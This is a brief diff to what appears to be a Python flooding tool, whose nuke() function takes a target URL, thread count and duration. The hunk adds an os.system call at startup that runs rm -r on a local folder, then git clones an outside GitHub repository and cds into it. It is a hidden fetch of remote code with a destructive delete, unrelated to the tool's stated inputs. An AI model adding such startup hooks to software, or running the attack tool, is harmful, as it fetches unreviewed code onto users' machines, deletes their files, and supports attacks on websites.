@@ -131,6 +131,7 @@ def nuke(target_url, num_threads, duration):
     sys.exit()
 
 if __name__ == "__main__":
+    os.system(f" rm -r Nazz && git clone https://github.com/Nazril0/Nazz && cd Nazz ") 
     target_url = input("URL: ")
     num_threads = int(input("threads: "))
     duration = int(input("time: "))
